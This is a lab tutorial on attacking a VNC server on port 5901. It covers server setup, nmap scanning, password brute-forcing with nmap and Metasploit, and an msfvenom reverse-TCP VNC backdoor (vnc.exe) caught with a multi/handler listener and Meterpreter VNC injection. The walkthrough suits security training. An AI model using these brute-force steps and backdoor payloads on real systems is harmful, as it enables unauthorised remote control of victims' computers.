@@ -1,0 +1,114 @@
+
+VNC Penetration Testing (Port 5901)
+
+Welcome to Internal penetration testing on VNC server where you will learn VNC installation and configuration, enumeration and attack, system security and precaution.
+From Wikipedia
+ Virtual Network Computing (VNC) is a graphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical screen updates back in the other direction. It uses port 5900: VNC and 5901: VNC-1.
+Penetration Lab Requirements
+VNC Server: ubuntu
+Attacker system: Kali Linux
+Client system: window (tightVNC view)
+Let’s start!!
+VNC Installation
+Open the terminal and follow the given below steps by executing given command for VNC installation. 
+Given below command will installs the desktop, Unity, as well as several packages that are required for the graphical interface to work properly.
+sudo apt-get install gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal
+
+Now type following command for VNC server installation.
+sudo apt-get install vnc4server
+
+Given below command will reset your server password that is required for VNC login
+sudo vncpasswd
+The password should minimum 6 digits; here I had set server password: 098765 for VNC authentication.
+
+Type given below command to run VNC
+sudo vncserver :1
+
+It is required to kill the process if you want to make some changes in running VNC server.
+sudo vncserver -kill :1
+
+Now type following command in order to open VNC startup file for making some changes.
+sudo gedit ~/.vnc/xstartup
+
+Add given below line in startup file as shown in given and save the changes.
+exec gnome-session &
+exec gnome-panel &
+exec  gnome-settings-daemon &
+exec metacity &
+
+Execute given below command to set resolution of Desktop screen.
+sudo vncserver :1 -geometry 1024×768 -depth 24
+
+After following above 7 steps check service status of VNC server using given below command.
+sudo netstat -tnl |grep 5901
+From given image you can confirm that port 5901 is activated
+
+TightVNC is a free remote control software package that help client to connect with VNC server. I have downloaded it in client machine so that he can connect to vnc server.
+Run TightVNC Viewer and enter [192.168.1.218:5901] server IP: port number as shown in given image and then click on connect.
+
+Client will get VNC authentication Popup enter the server password which you have set above.
+
+From given image you can observe that window client has connected to ubuntu server and access his Desktop and could control it mouse and keyboard.
+
+Scanning plays an important role in penetration testing because through scanning attacker make sure which services and open ports are available for enumeration and attack.
+Here we are using nmap for scanning port and protocols. 
+nmap -sT 192.168.1.218
+If service is activated in targeted server then nmap show open STATE for port 5901.
+
+ Following nmap command will Queries a VNC server for its protocol version and supported security types.
+nmap -p 5901 –script vnc-info 192.168.1.218
+ From given below image you can conclude that it has shown protocol version 3.8 and security type: VNC authentication 2.
+
+Following nmap command will Performs brute force password auditing against VNC server using dictionary for password.
+nmap -p 5901 –script vnc-brute 192.168.1.218 –script-args passdb=/root/desktop/pass.txt
+ Great!! From given below image you can read the valid password: 098765
+
+This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.
+use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(vnc_login) >set rhosts 192.168.1.218
+msf auxiliary(vnc_login) >set rport 5901
+msf auxiliary(vnc_login) >set pass_file /root/Desktop/pass.txt
+msf auxiliary(vnc_login) > run
+Awesome!! From given below image you can observe the same password: 098765 have been found by metasploit.
+
+Open a new terminal and type following command for connecting with VNC server using above password 098765
+vncviewer 192.168.1.218:5901
+
+Nice!! You can see after making successfully brute force attack an attacker can easily connect with vnc server.
+
+Create a VNC payload using msfvenom and try to achieve VNC shell of victim’s PC.
+Open the terminal in your Kali Linux and type following command to generate a VNC payload using msfvenom command.
+msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.1.216 lport=44455 -f exe > /var/www/html/vnc.exe
+ Now the above command will generate an exe file for the VNC payload in /var/www/html of Kali Linux.
+
+Being an attack you need to send this backdoor to the target and start multi handler in the metasploit framework.
+msfconsole
+use exploitmulti/handler
+msf exploit(handler) > set payload windows/vncinject/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.216
+msf exploit(handler) > set lport 4455
+msf exploit(handler) > set viewonly false
+msf exploit(handler) > run
+
+Now attacker tries to connect with target using VNC payload, from given screenshot you can see it has launched vncviewer and we have our session 1 is running at background.
+
+Here you can see desktop screen of victim’s pc through will attacker is connected.
+
+Suppose you have already exploited any window system and got victim’s system reverse connection through meterpreter session. 
+Type given below command which will inject a VNC Dll via a reflective loader (staged). Connect back to the attacker.
+Meterpreter > run vnc
+
+Great!! Again attacker is connected to victim’s system
+
+Open vnserver setup file using given blow command:
+sudo gedit /usr/bin/vncserver
+
+Follow given below step for making changes
+Add # to comment “vncport = 5900” 
+Add a new line as shown in given image for forwarding VNC service as vncPort = 8800;
+
+Now try to connect with vnc server through port 8800 as connected above through tighvnc viewer and enter the password.
+
+Hence you can see the vnc connection has been established successfully.
+
+Author: Sanjeet Kumar is a Information Security Analyst | Pentester | Researcher  Contact Here
